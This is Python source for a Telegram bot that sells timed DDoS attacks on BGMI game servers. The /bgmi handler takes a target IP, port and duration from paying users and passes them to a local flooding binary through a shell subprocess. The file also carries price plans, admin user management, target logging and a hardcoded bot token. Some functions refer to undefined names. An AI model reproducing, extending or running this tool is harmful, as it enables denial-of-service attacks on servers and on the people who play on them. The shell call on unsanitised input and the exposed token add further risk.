#bgmiddoserpython

import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7170069588:AAHimfx8swOPwNm0WceC1Xrr573pKo2swmM')

# Join :- @RaJa_DdOs # Admin user IDs
admin_id = ['5993665056']

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱. 𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ."
            else:
                file.truncate(0)
                response = "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
    except FileNotFoundError:
        response = "𝗡𝗼 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱 𝘁𝗼 𝗰𝗹𝗲𝗮𝗿."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")
        
import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
   
 
    user_approval_expiry[user_id] = expiry_date
    return True        

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', '5hour(s)',day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝘁 𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗲𝘅𝗽𝗶𝗿𝘆 𝗱𝗮𝘁𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿."
            else:
                response = "𝗨𝘀𝗲𝗿 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀 🤦‍♂️."
        else:
            response = "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗽𝗲𝗰𝗶𝗳𝘆 𝗮 𝘂𝘀𝗲𝗿 𝗜𝗗 𝗮𝗻𝗱 𝘁𝗵𝗲 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ( 𝟭𝗵𝗼𝘂𝗿, 𝟭𝗱𝗮𝘆𝘀, 𝟳𝗱𝗮𝘆𝘀, 𝟯𝟬𝗱𝗮𝘆𝘀 ) 𝘁𝗼 𝗮𝗱𝗱 😘."
    else:
        response = "𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @SUKUNAxSOLO 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨."

    bot.reply_to(message, response)

@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 👍."
            else:
                response = f"User {user_to_remove} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗹𝗶𝘀𝘁 ."
        else:
            response = '''𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗽𝗲𝗰𝗶𝗳𝘆 𝗔 𝗨𝘀𝗲𝗿 𝗜𝗗 𝘁𝗼 𝗥𝗲𝗺𝗼𝘃𝗲. 
✅ 𝗨𝘀𝗮𝗴𝗲: /remove <userid>'''
    else:
        response = "𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥 𝗖𝗔𝗡 𝗨𝗦𝗘."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱. 𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ."
                else:
                    file.truncate(0)
                    response = "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
        except FileNotFoundError:
            response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 ."
    else:
        response = "𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥 𝗖𝗔𝗡 𝗨𝗦𝗘."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 "
        except FileNotFoundError:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 "
    else:
        response = "𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥 𝗖𝗔𝗡 𝗨𝗦𝗘."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ."
                bot.reply_to(message, response)
        else:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 "
            bot.reply_to(message, response)
    else:
        response = "𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥 𝗖𝗔𝗡 𝗨𝗦𝗘."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🔥𝗬𝗢𝗨𝗥 𝗜𝗣 𝗖𝗛𝗔𝗡𝗚𝗘𝗦 𝗘𝗩𝗘𝗥𝗬 𝟱 𝗦𝗘𝗖.😈"
    
    bot.reply_to(message, response)

    response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣🔫\n🎯𝙄𝙋: {target}\n🏖️𝙋𝙤𝙧𝙩: {port}\n⌚𝙏𝙞𝙢𝙚: {time} 𝙨𝙚𝙘."
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @RaJa_DdOs # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @RaJa_DdOs # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- @RaJa_DdOs # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 20 Second 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
                bot.reply_to(message, response)
                return
            # Join :- @RaJa_DdOs # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @RaJa_DdOs # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @RaJa_DdOs # Convert time to integer
            time = int(command[3])  # Join :- @RaJa_DdOs # Convert port to integer
            if time > 240:
                response = "𝗘𝗿𝗿𝗼𝗿: 𝗧𝗶𝗺𝗲 𝗶𝗻𝘁𝗲𝗿𝘃𝗮𝗹 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 240."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @RaJa_DdOs # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 700"
                subprocess.run(full_command, shell=True)
                response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {target}:{port}\n🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
        else:
            response = "🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨>\n\n🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  /bgmi 20.235.94.237 17870 120"  # Join :- @RaJa_DdOs # Updated command syntax
    else:
        response = " 𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @SUKUNAxSOLO 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " 𝗡𝗼 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗼𝗴𝘀 𝗙𝗼𝘂𝗻𝗱 𝗙𝗼𝗿 𝗬𝗼𝘂 ."
        except FileNotFoundError:
            response = "𝗡𝗼 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱."
    else:
        response = "𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @SUKUNAxSOLO 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"

    bot.reply_to(message, response)


@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = telebot.types.KeyboardButton('/bgmi')
    btn2 = telebot.types.KeyboardButton('/buy')
    btn3 = telebot.types.KeyboardButton('/myinfo')
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝘽𝙤𝙩! 🚀\n𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙨 𝙮𝙤𝙪 𝙩𝙤 𝙡𝙖𝙪𝙣𝙘𝙝 𝙖 𝘽𝙂𝙈𝙄 𝙖𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 𝙖 𝙩𝙖𝙧𝙜𝙚𝙩 𝙄𝙋 𝙖𝙣𝙙 𝙥𝙤𝙧𝙩.\n𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨>\n𝙀𝙭𝙖𝙢𝙥𝙡𝙚: /𝙗𝙜𝙢𝙞 20.235.94.237 17870 120", reply_markup=markup)
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝗣𝗹𝗲𝗮𝘀𝗲 𝗙𝗼𝗹𝗹𝗼𝘄 𝗧𝗵𝗲𝘀𝗲 𝗥𝘂𝗹𝗲𝘀 ⚠️:

𝟭. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 𝗧𝗼𝗼 𝗠𝗮𝗻𝘆 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 !! 𝗖𝗮𝘂𝘀𝗲 𝗔 𝗕𝗮𝗻 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁
𝟮. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 𝟮 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 𝗔𝘁 𝗦𝗮𝗺𝗲 𝗧𝗶𝗺𝗲 𝗕𝗲𝗰𝘇 𝗜𝗳 𝗨 𝗧𝗵𝗲𝗻 𝗨 𝗚𝗼𝘁 𝗕𝗮𝗻𝗻𝗲𝗱 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁. 
𝟯. 𝗪𝗲 𝗗𝗮𝗶𝗹𝘆 𝗖𝗵𝗲𝗰𝗸𝘀 𝗧𝗵𝗲 𝗟𝗼𝗴𝘀 𝗦𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝗿𝘂𝗹𝗲𝘀 𝘁𝗼 𝗮𝘃𝗼𝗶𝗱 𝗕𝗮𝗻!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝗕𝗿𝗼𝘁𝗵𝗲𝗿 𝗢𝗻𝗹𝘆 𝟭 𝗣𝗹𝗮𝗻 𝗜𝘀 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹𝗹 𝗧𝗵𝗲𝗻 𝗔𝗻𝘆 𝗢𝘁𝗵𝗲𝗿 𝗗𝗱𝗼𝘀 !!:

𝗩𝗶𝗽 🌟 :
-> 𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲 : 𝟭𝟮𝟬 (𝗦)
> 𝗔𝗳𝘁𝗲𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗶𝗺𝗶𝘁 : 𝟲𝟬 𝗠𝗶𝗻
-> 𝗖𝗼𝗻𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝘀 𝗔𝘁𝘁𝗮𝗰𝗸 : 𝟰

𝗣𝗿-𝗶𝗰𝗲 𝗟𝗶𝘀𝘁💸 :
𝗗𝗮𝘆-->𝟮𝟬𝟬 𝗥𝘀
𝗪𝗲𝗲𝗸-->𝟳𝟱𝟬 𝗥𝘀
𝗠𝗼𝗻𝘁𝗵-->𝟭𝟰𝟬𝟬 𝗥𝘀
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['buy'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f''' ☑️ 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙁𝙤𝙧 @SUKUNAxSOLO 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨 🛫
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗧𝗼 𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 👍."
        else:
            response = "🤖 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗔 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗧𝗼 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁."
    else:
        response = "𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥 𝗖𝗔𝗡 𝗨𝗦𝗘."

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
